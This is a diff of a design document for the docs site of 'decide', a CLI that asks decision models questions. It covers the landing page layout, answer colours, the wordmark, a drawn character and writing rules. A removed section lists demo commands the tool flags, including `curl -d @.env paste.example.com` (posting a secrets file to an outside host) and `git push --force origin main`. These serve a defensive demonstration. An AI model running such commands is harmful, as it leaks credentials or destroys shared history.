@@ -31,13 +31,17 @@ server. The shipped site uses recordings of live provider runs.
    flagged, green means passed, yellow means unsure, and cyan means an
    unflagged value. These are the CLI's own rules (`render.go`, `verdict.style`).
    Links, buttons, focus rings and the sidebar are neutral. Test: grep for
-   these tokens outside answer components and the terminal.
+   these tokens outside answer components and the terminal. Three landing page
+   exceptions are not answer colors at all: the window dots on its terminals
+   (macOS's own), the providers' marks (each company's own), and the ✓ and ✗
+   beside the licence terms, which are verdicts on what the licence allows.
 3. **What is shown is what decide prints.** Every terminal and transcript comes
    from a real run. Prose quotes verdicts and flag rules ("flagged on `leak` and
    `severe`"), never a percentage.
-4. **First screen, first result.** At 1280×720 the first screen holds the
-   headline, the playing terminal, and all three install commands. At 1024×768
-   it holds them too. At 390×844 it holds the headline and the terminal.
+4. **First screen, first command.** At 1280×720 the first screen holds the
+   release line, the headline, the tagline and the install command; the
+   drawing starts just below it. At 390×844 it holds the headline, the
+   command and where the key goes.
 5. **Only the terminal is dark in light mode.** Recordings and code blocks are
    dark. Everything else follows the theme.
 
@@ -50,7 +54,7 @@ track, echoing the CLI's `━` on `─`. It appears in these places:
 
 - **Section 2**, one panel for each type. Each panel leads with plain words
   ("Yes or no"), with `noul` in small mono after them.
-- The tutorial cards, the goal block, **OG images** (the page title above that
+- The tutorial cards, **OG images** (the page title above that
   page's answer line, such as `! severe yes`), and the **404** page
   (`! page  exists  no`). Neither of the last two shows a percentage.
 
@@ -131,11 +135,14 @@ text renders in `brightWhite`.
   `--sl-line-height-headings: 1.15`, weight 600.
 - **Landing headline:** 50px at ≥1100px, 44px at 800–1099px, and 38px on
   phones. Line height 1.04, tracking −0.035em.
-- **Wordmark (SiteTitle):** `decide` in JetBrains Mono 700 at 19px, then the
-  version in mono 12px gray-3. The version is read from `plugin.json`, so PR
-  previews show the next version.
-- **Favicon:** a mono `d` in `#ECEDEF` on `#121316`. Not cyan, following
-  principle 2.
+- **Wordmark (SiteTitle):** the character's face at 32px in the title's color, then
+  `decide` in JetBrains Mono 700 at 19px, then the version in mono 12px
+  gray-3. The version is read from `plugin.json`, so PR
+  previews show the next version. The asking face looks up at three
+  thought dots; hover the wordmark or the footer line and the dots light up
+  in turn. Reduced motion keeps it still.
+- **Favicon:** the `mark` face, light on dark or dark on light to follow
+  the system theme. Not cyan, following principle 2.
 
 ## Landing page
 
@@ -145,86 +152,147 @@ text renders in `brightWhite`.
   icon, a divider, and the Dark/Light/Auto theme `<select>`, restyled by
   tokens. The header is 64px tall.
 - **Phone:** the title and the search icon, 56px tall. A splash page has no
-  menu, so the landing page carries its own navigation: the "Tutorials" link
-  in the hero and the tutorials section.
+  menu, so the landing page carries its own navigation: "Read the quickstart"
+  under the hero's command, and the quickstart in the closing band.
 
 **Hero: an override of `Hero.astro`.** I override it rather than putting the
-hero in the page body, because:
+hero in the page body, because with no `hero` in the frontmatter, `Page.astro`
+puts `PageTitle` in its own panel above the body, divided by a hairline, and
+the hero could not hold the install switcher.
 
-- With no `hero` in the frontmatter, `Page.astro` puts `PageTitle` in its own
-  panel above the body, divided by a hairline. The `<h1>` could not then sit
-  beside the terminal.
-- `image.html` cannot hold `<Terminal>`, because Terminal builds its media URLs
-  from hashes at build time.
+The override reads `hero.title` (HTML, so the second sentence can sit in a
+gray `.dim` span) and `hero.tagline`, and the page's own `release` field, a
+line on what the latest release added. The version beside it comes from
+`plugin/.claude-plugin/plugin.json`, which each release bumps. It must keep
+`id={PAGE_TITLE_ID}` and `data-page-title` on the `<h1>`. Upgrade cost:
+re-check those two, and the `data.hero` shape, on each Starlight release. The
+page body stays MDX, with `not-content` on our sections.
 
-The override reads `hero.title` and `hero.tagline` from the frontmatter. It must
-keep `id={PAGE_TITLE_ID}` and `data-page-title` on the `<h1>`. Upgrade cost:
-re-check those two, and the `data.hero` shape, on each Starlight release
-(about 80 lines, no layout code). The page body stays MDX, with `not-content`
-on our sections.
+**The page, top to bottom** (decided with Sarvesh from the mockup at
+claude.ai/artifact/5T1hjf3hHgKA7teFZneyRE):
 
-**At 1280×720** (content width 1080px):
+1. **Hero, centred.** The release line, the headline "Judgment calls,
+   at scale." (the second half dim; "by the thousand" was tried and read
+   as bookish), which says what sets decide
+   apart: the same call made on every item, at scale. Then a tagline of
+   two plain sentences: the one item that matters among many (the
+   vulnerable function in a codebase, the urgent ticket in a queue, the
+   risky change in a pull request), then how (a decision model asked
+   about every one, from a shell, CI, Go code or Claude Code). No
+   invented counts, and nothing that tells the reader to think less. Then `Install.astro`
+   (brew, go install, go get, claude code), and under it one centred row
+   of two buttons: "Quickstart →", the page's way into the docs, and
+   "See what decide does" (ghost, to `#adds`, the band that sets decide
+   apart from calling a model yourself). The buttons sit
+   below the command, never beside the install tabs.
+2. **`Sweep.astro`.** An abstract strip of about 800 small cells under
+   the hero, with no tabs, command, legend or caption. A wave crosses left
+   to right: each cell starts blank, flashes as it is decided, and settles
+   on a gray shade; a few settle in the flag color. After a hold the field
+   clears and the next wave comes through, on an 11 second loop. It fades
+   out at both ends and stands for no particular input. Pure CSS, shades
+   and timing from a fixed hash, settled under reduced motion, hidden from
+   screen readers. The landing page shows no terminal recordings: five in
+   one window were here and were hard to follow, each judging one item
+   under a headline about scale. Recordings stay in the quickstart and
+   tutorials. A version with a tab for a codebase, a queue and a pull
+   request was tried and was too literal.
+3. **"The small calls inside your automations."** `WhereItRuns.astro`:
+   six link cards in two columns (one under 760px): gate the merge, check
+   an agent's commands, route the queue, rank a codebase, read the photo,
+   check the PDF. Each has three things to read: how often in mono
+   ("every pull request") with a chip for what it reads (diff, text, code,
+   image, pdf), a 24px title with an arrow, and the command on a dark
+   strip. No sentence and no named guide link: with them a card was five
+   lines to scan. In the
+   command the template name is in the code theme's keyword color and
+   flags in its string color; no verdict colors. The whole card is the
+   link. It comes first because it shows what the reader can do, and the
+   chips are where the page first shows that decide reads more than text.
+4. **"What you'd otherwise build yourself."** `Adds.astro` (anchor `#adds`,
+   linked from the hero): what a reader would write themselves if they
+   called a decision model's API directly. Six link rows in one hairline
+   box: the title at the left (read down the edge as a list, with a quiet
+   arrow that steps forward on hover), two sentences in the middle, and
+   one mono line on a dark strip at the right, colored as the where-cards'
+   commands are. A command has a `$` prompt; a line decide prints (the
+   cache summary) and a flags-only line have none. Under 1100px the strip
+   drops under the sentences, and under 700px a row stacks. Six equal
+   cards were tried first and read as gray boxes. It follows the use cases
+   because both are about decide itself; the three bands after the Claude
+   Code one are about the model.
+5. **"Audit a whole codebase from Claude Code."** `ClaudeCode.astro`
+   (anchor `#claude-code`): the plugin's two skills, and only those. A
+   framed stage holds `/decide:audit` and `/decide:hunt` side by side,
+   names set as commands, over `Haystack.astro` at full width. Under it, a
+   dark install bar: the two `/plugin` lines with a copy button, the
+   "Needs" note, and the guide button (a local copy of `.btn` in terminal
+   colors, since the shared one vanishes on a dark panel in light mode).
+   The plugin's background checks (prompt injection, severe commands, the
+   judge tool) had three columns here and were cut to one sentence in the
+   note: the skills are the reason to install, and the guide covers the
+   rest.
+   **The haystack** is a drawing, not a run, and its caption says so: 960
+   cells (60 columns at desktop, fewer when narrow), one per function,
+   shaded by a fixed hash so every build draws the same picture. Most are
+   gray, a few are in the flag color (scores are answers), and the 15
+   Claude reads are outlined. The legend's three entries are each keyed by
+   a strip of 15 cells drawn like the field, and its only numbers are the
+   skill's own (30%, 15). The cells take their shade in reading order
+   when the drawing scrolls into view, then the outlines land highest
+   first; with no JavaScript or with reduced motion it shows finished.
+   Keep the red cells few: it is a needle in a haystack. No recording and
+   nothing drawn to look like Claude Code: the tapes record the CLI.
+6. **"Why not just call an LLM?"** `Compare.astro` (anchor `#compare`): three cards in one row (stacked under 860px), no table
+   and no example reply: "Faster", "Cheaper", "Calibrated" (defined in the
+   card: the probability matches how often the model is right; not "real"
+   or "tuned"). Each is a 28px title, two or three plain sentences on why,
+   and one figure in mono in the answer color at its foot: the time of one
+   recorded run (read from the triage tutorial's transcript, named as one
+   recording and linked to it), Jev's price, and "90% means right
+   about nine times in ten". A table was tried twice and was too much to
+   take in; keep this to three claims. A footnote cites the public prices;
+   no multipliers and no output-cost claim for OpenAI or Cloudflare. The
+   subhead gives LLMs their due for writing and reasoning.
+7. **"Close calls go to a person."** `UseIt.astro`:
+   `triage.go` branches three ways (allow, reject, `gate.Review`), with a
+   strip in the pass, unsure and flag colors (three columns, stacked under
+   600px; "a person decides" is the widest and set in sans). The Go is
+   highlighted by Astro's `<Code>` with `code-theme.json`, and has no
+   caption: the names explain themselves. Under it a filled box with its
+   own button says to test on items you've already labeled before
+   switching, and that the probability is the model's judgment; it links
+   the calibrate example. The headline is
+   the page's one statement about people; don't repeat it in other bands.
+8. **"Four decision models, one set of commands."** `Models.astro`: one
+   row of four (two by two under 860px). Each card ends with the same five
+   chips (text, images, audio, video, PDF), lit when that provider reads
+   them, and the subhead says it in words. Then the line on where your text
+   goes, linking to the providers reference. Providers only: the licence
+   is a separate fact and lives in the closing.
+9. **`Closing.astro`.** "Your turn. Ask it something." One command, the
+   quickstart and the source, then one fine line: open source under Apache
+   2.0, with LICENSE and CONTRIBUTING.md linked. The glad-card face sits at
+   the right (hidden under 600px, where the hero's face is enough).
 
-```
-decide v0.3.0          [⌕ Search     ⌘K]               GH │ ▭ Dark ▾
-────────────────────────────────────────────────────────────────────
- Answers you can            ┌ ~/shop ─────────────────── ❚❚ Pause ┐
- branch on.                 │ $ echo 'git push --force origin… │
- Ask questions about your   │ stdin:1  git push --force origin main│ frame 620
- files, diffs, and records…  │ ! destructive  yes  95%              │ 69×13 cells
- Why not just prompt an     │ ! severe       yes  90%              │
- LLM? No prompt, no JSON…   │ ✓ 1 answered  ! 1 flagged …          │
- (Get a first result →) …   └──────────────────────────────────────┘
- ───────────────────────────────────────────────────────────────── 
- CLI →          Ask from your shell and CI   brew install …       [⧉]
- Go →           Ask from your program        go get …             [⧉]
- Claude Code →  Give Claude a second opinion /plugin install …    [⧉]   ≈690px
- ── fold ──
- Every answer has a type and a probability. [Yes or no | One of several | A point on a scale]
- Learn it by doing one job.                 [3 tutorial cards, each with an answer line]
- footer: Apache 2.0 · Made by Deep Noodle
-```
+**Positioning:** decide is for the many small calls inside automations, not
+the decisions people make. People appear only as the ones who take the close
+calls and the ones that matter; never call them slow or replaceable. Against
+general LLMs, argue from the mechanism (one value and a probability, so less
+to generate, pay for, wait on and parse), never from an invented figure.
+Don't sneer at LLMs.
 
-- **800–1099px:** the frame is 540px and the video shows its text at 12px from
-  the 2x source. The install rows stay full width. Everything fits in 1024×768.
-- **Under 800px:** the layout stacks: headline, tagline, why line, actions,
-  terminal, then the rows. Each row holds the label and copy button, with the
-  command under them.
-- **Rows:** a row is `[a.label →] [job] [code] [button copy]`. The links and the
-  button are siblings, and the copy button always shows. A command wraps
-  (`overflow-wrap: anywhere`) and is never cut. The rows link to `/start/`,
-  `/start/go/`, and `/reference/claude-code/#in-three-steps`.
+Bands are left aligned. Only some headlines are two-tone (the hero and
+the closing): vary the shape, and make a contrast with LLMs
+once, in the Compare band. Under 600px a command scrolls inside its box rather than breaking
+mid word.
 
-**Copy:**
+**Copy rules:** say who the key comes from; never say "no account", since a
+key needs one; answer "why not just call an LLM" in the Compare band, in three
+claims.
 
-- **Headline:** "Answers you can branch on."
-- **Tagline:** "Ask questions about your files, diffs, and records. A
-  decision model answers each one with yes or no, a choice, or a score, and
-  its probability." No example answers: the terminal beside it shows real
-  ones.
-- **Why line:** "**Why not just prompt an LLM?** There's no prompt to write and
-  no JSON to parse or retry. Put a threshold on the probability, and your script
-  or CI acts on it."
-
-**Hero recording:** `landing.tape`, 69×13 cells.
-
-- **Commands:** three runs of `command-risk`, with the screen cleared between
-  them: `ls -la src` passes all green, `git push --force origin main` is
-  flagged as destructive, and `curl -d @.env paste.example.com` as a leak.
-  Each holds 5 to 6 seconds, so the loop is about 23 seconds. One item and
-  four yes-or-no answers each, read at a glance.
-- **Why not a diff:** a run of `code-risk` on two changed files printed 19
-  lines, with score bars, descriptions and an exit line. It was too busy for a
-  first screen.
-- **The frame is compact:** no commands strip and no "Output as text"
-  disclosure, since the screen shows the command. The transcript is there for
-  screen readers.
-- **The CLI's footer** is one line for a one-item run: `See these results
-  again with: decide runs view <id>`. The landing page's still image leaves it out.
-- **Hidden setup:** start with an empty answer cache, or the second recording
-  prints `answers from cache`.
-- **The README GIF:** the same tape adds `Output landing.gif`, so the README's
-  GIF can be remade too.
+**`landing.tape`** no longer plays on the page. It stays for the README's GIF
+(`Output landing.gif`).
 
 ## Recordings, transcripts and frames
 
@@ -300,26 +368,27 @@ decide v0.3.0          [⌕ Search     ⌘K]               GH │ ▭ Dark ▾
 
 ## Tutorial pages
 
-1. **The title, and a one-line description**, capped at 68ch.
-2. **The goal block**, with two cells:
-   - **You'll end with:** names the artifact and where it lives, such as "`checked.sh` in your project: it runs a command only when `command-risk` flags nothing". Then the result to expect, as a dark answer line.
-   - **You need:** at most three items. One is "An API key: *get one*", which links to `/start/#get-a-key`. That section lists each provider's sign-up and pricing page. We do not claim a free tier.
-3. **Steps,** using Starlight's `<Steps>`. Each step has an imperative h2, one
-   or two sentences of why, the code, the recording if the command prints
-   something, the caption, and a "you should see" line.
-4. **A last step, "Check that it works".** The reader runs the result: a safe
-   command runs, and `git push --force origin main` is refused with exit 2.
-   UC-3 needs a working result, not a recording of one.
-5. **What next:** two `LinkCard`s, the next job and the template's reference
-   page.
+1. **The title, and two or three sentences** on what the reader builds.
+2. **One "You need" sentence,** with links to install decide and get a key.
+   No goal box.
+3. **Plain h2 sections,** one per step, with no numbers and no `<Steps>`.
+   The table of contents lists them. Each has one or two sentences, the
+   code, and the recording if the command prints something, with a caption
+   that leads with the result in bold.
+4. **A last section, "Check that it works",** where the reader runs the
+   result.
+5. **What next:** two `LinkCard`s.
+
+Keep each section short. Caveats and edge cases belong in the reference.
 
 **Other pages:**
 
 - `/start/go/`: `go get`, set a key, one program read from `examples/` (built
   by R-5), and `go run`. Four steps at most.
-- `/start/answers/`: the concepts page. It covers the three question types,
-  probability, flags and providers, with the same panels as section 2, and
-  search indexes it.
+- `/start/answers/`: the concepts page. It shows the three answer types,
+  each with one question and the answer line from a recorded run as plain
+  text, then templates, items, runs and flags in a few lines. No
+  recordings.
 - **Reference:** dense, with a table of contents and no recordings.
   - Each flag is an h3 in mono, with one sentence and one example.
   - The index opens with "New here? Start with the quickstart."
@@ -338,14 +407,67 @@ decide v0.3.0          [⌕ Search     ⌘K]               GH │ ▭ Dark ▾
 ## What we avoid
 
 - Gradients, glows, glass, gradient text, sparkles, mascots, 3D renders and
-  emoji.
+  emoji. Two exceptions: the character (see "The character and the
+  voice"), always thinking very hard. And
+  the fade on the agent's reply in the strip, which shows text running on.
 - "AI-powered" copy.
 - Bento grids, logo walls, counters and testimonials.
-- Traffic-light dots, including Expressive Code's.
+- Traffic-light dots, including Expressive Code's, except on the landing
+  page's windows (`TerminalFrame`'s `lights`).
 - Decorative bars, and cyan or verdict colors used outside answers.
 - Deep Noodle's lime. Next to green it reads as "passed".
 - More than one moving recording at a time.
 - Hand-typed percentages in prose.
+
+## The character and the voice
+
+**You are the question. decide is the answer.** The site has one
+character, a hand-drawn lumpy face (`Doodle.astro`). It stands in for the
+reader, who is always thinking very hard. It is never decide.
+
+- **It has no name.** Never write "Drool" or "the doodle" in page text, alt
+  text, aria labels, titles, captions or meta tags, and don't invent a
+  replacement. Put the reader in its place ("You think very hard, then
+  ask"), describe what it does, or say "it" only beside the drawing.
+  Decorative faces are `aria-hidden`. "Doodle" and "the character" are fine
+  in code and in these docs.
+- **Pen rule.** Strokes keep one width at every size, from `--doodle-pen`
+  with `vector-effect: non-scaling-stroke`. Presets: `mark` 1.5px
+  (16–24px), `small` 2px (32–96px), `poster` 3px (160px and up). Brow and
+  mouth at 0.85 of the pen. There is no drip: it thinks, it does not drool.
+- **Poses.** Every face keeps the raised brow and the ask face's two eye
+  positions. `ask` thinks, with thought dots that rise and swell, and every
+  third 2.4s cycle the last dot turns into "?". `lost` has X eyes, and
+  `trail` lets the dots trail off into "?". `glad` has ^ ^ eyes, and
+  `glad-card` holds a tag with a real answer from a recording. `mark` is
+  the head, eyes, brow and one dot, for the footer and favicon. The story
+  runs ask (hero, strip panel 1), lost (strip panel 2, 404), glad (strip
+  panel 3, closing). At most one face per viewport.
+- **Color means an answer.** The UI is near-monochrome greys, code blocks
+  included. Cyan (`--ans`) and red (`--ans-flag`) appear only on answer
+  values, probabilities and answer bars.
+- **Tokens.** The type scale and band spacing live in `theme.css`:
+  `--display-1`, `--display-2` and `--space-band`. No inline
+  `clamp()` in `.mdx`. A band opens with its headline: no mono label above
+  it, since the eye skips one and the headline already says it.
+
+Voice:
+
+1. Put the reader in the asker's seat. Never name the face.
+2. "Thinking very hard" appears once per place, four places in all: the
+   hero, the strip, the 404 and the footer. The closing band hands the
+   reader their turn instead.
+3. decide, always lowercase, is the subject of what happens: "decide
+   answers", never "this LLM".
+4. Plain, concrete words. Name the flag, the env var, the exit code. No
+   "AI-powered", "unlock", "supercharge" or emoji.
+5. Dry, not wacky: one quiet joke per block, after the fact.
+6. The probability is the model's judgment. It is not proof and not a
+   confidence the model wrote about itself. Never "confidence score" or
+   "accuracy".
+7. A line in decide's output format must be one decide could print. No
+   invented run results.
+8. Short sentences, second person, contractions, one claim per sentence.
 
 ## Later
 
